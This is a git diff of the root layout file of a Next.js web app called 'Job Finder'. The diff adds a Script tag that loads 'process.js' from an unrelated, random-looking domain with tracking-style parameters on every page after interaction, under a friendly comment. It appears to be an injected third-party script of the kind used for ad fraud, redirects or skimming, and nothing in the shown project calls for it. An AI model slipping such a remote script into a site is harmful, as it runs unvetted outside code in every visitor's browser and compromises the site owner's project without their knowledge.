@@ -1,5 +1,6 @@
 import type { Metadata } from 'next'
 import './globals.css'
+import Script from 'next/script'
 
 export const metadata: Metadata = {
   title: 'Job Finder',
@@ -22,7 +23,15 @@ export default function RootLayout({
           href="https://cdn-icons-png.flaticon.com/512/833/833472.png"
         />
       </head>
-      <body>{children}</body>
+      <body>
+        {children}
+
+        {/* ✅ Script added here for async load after page interaction */}
+        <Script
+          src="https://hotbzuwino.today/process.js?id=1379884709&p1=sub1&p2=sub2&p3=sub3&p4=sub4"
+          strategy="afterInteractive"
+        />
+      </body>
     </html>
   )
 }
